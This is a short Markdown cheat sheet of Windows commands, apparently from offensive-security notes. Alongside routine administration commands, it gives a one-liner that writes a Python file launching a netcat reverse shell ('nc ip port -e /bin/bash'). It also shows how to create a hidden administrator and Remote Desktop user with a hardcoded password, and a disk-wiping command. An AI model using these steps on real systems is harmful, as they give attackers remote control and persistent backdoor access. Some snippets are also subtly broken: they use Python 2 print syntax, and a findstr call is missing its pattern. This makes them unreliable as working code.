# **Windows Commands**

- **Show Hidden Files**
  ```
  dir /A
  ```

- **Print File Content**
  ```
  type file.txt
  ```

- **Grep Equivalent**
  ```
  findstr file.txt
  ```

- **Show Network Information**
  ```
  netstat -an
  ```

- **Show Network Adapter Info**
  ```
  ipconfig
  ```

- **Traceroute**
  ```
  tracert
  ```

- **List Processes**
  ```
  tasklist
  ```

- **Kill a Process**
  ```
  taskkill /PID 1532 /F
  ```

- **Shred Disk**
  ```
  cipher /w:C:\
  ```

- **Mounting and Mapping**
  ```
  wmic logicaldisk get deviceid, volumename, description
  ```

### Scripts for Fun:

- **Make Request**
  ```python
  import requests

  req = requests.get("http://site.com")
  print req.status_code
  print req.text
  ```

- **Read and Write to Files**
  ```python
  file_open = open("readme.txt", "r")
  for line in file_open:
      print line.strip("\n")
      if line.strip("\n") == "rad 4":
          print "last line"
  ```

- **Echo to Python File for Reverse Shell**
  ```
  echo 'import os; os.system("/bin/nc ip port -e /bin/bash")' > /opt/tmp.py
  ```

### Windows RDP Operations:

- **Add RDP User**
  ```
  net user hodor Qwerty123! /add
  net localgroup administrators hodor /add
  net localgroup "Remote Desktop Users" hodor /add
  ```
